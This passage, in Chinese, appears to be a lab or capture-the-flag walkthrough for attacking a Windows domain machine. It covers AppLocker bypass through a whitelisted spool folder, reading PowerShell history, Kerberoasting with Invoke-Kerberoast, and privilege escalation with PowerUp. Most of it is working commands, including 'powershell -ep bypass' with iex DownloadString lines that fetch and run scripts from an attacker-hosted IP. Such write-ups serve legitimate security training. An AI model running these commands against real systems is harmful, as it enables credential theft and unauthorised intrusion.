 kerberoasting、规避 AV、绕过 applocker 以及提升在 Windows 系统上的权限。


## 绕过 AppLocker
appLocker 配置了默认 AppLocker 规则，我们可以通过将可执行文件放在以下目录中来绕过它：

```
C：\Windows\System32\spool\drivers\color
```


在这里就能看到powershell的历史记录
```
 %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Kerberos 
Kerberos 是 Windows 和 Active Directory 网络的身份验证系统。

```
运行 setspn -T medin -Q */*
```

我们可以提取 SPN 中的所有账户


```
powershell -ep bypass;  
iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1')
```

```

#目标机上的白名单目录路径： C:\Windows\System32\spool\drivers\color 

#先在本地机上下载所需的ps1脚本（下面的wget命令可能不需要，因为本地kali机中可能已经预装了Invoke-Kerberoast.ps1脚本）： wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 
#使用命令托管脚本文件到本地机的HTTP服务器上： python -m http.server 80 

#最后在目标机上使用以下命令获取ps1脚本文件： Invoke-WebRequest -Uri http://10.13.16.58:80/Invoke-Kerberoast.ps1 -OutFile C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1 

#切换到ps1脚本所在目录并查看脚本文件是否存在： cd C:\Windows\System32\spool\drivers\color\ dir 

#方法二（在目标机器中进行操作） #powershell -c "(new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1', 'C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1')"  


#注意：使用. .\可加载脚本到内存中执行，此处两个.符号之间有一个空格。 . .\Invoke-Kerberoast.ps1 Invoke-Kerberoast -OutputFormat hashcat | fl  

```

## 提权

```
#目标机上的白名单目录路径： C:\Windows\System32\spool\drivers\color 

#先在本地机上下载所需的ps1脚本（下面的wget命令可能不需要，因为本地kali机中可能已经预装了PowerUp.ps1脚本）： wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 

#再使用命令托管脚本文件到本地机的HTTP服务器上： python -m http.server 80 

#最后在目标机上使用以下命令获取ps1脚本文件： Invoke-WebRequest -Uri http://10.13.16.58:80/PowerUp.ps1 -OutFile C:\Windows\System32\spool\drivers\color\PowerUp.ps1 

#切换到ps1脚本所在目录： cd C:\Windows\System32\spool\drivers\color dir . .\PowerUp.ps1 Invoke-Allchecks 

#方法二 #远程下载并执行文件 
#iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 

#方法三 
#powershell -c "(new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1', 'C:\Windows\System32\spool\drivers\color\PowerUp.ps1')" 

#切换到ps1脚本所在目录： #. .\PowerUp.ps1 #Invoke-Allchecks  
```
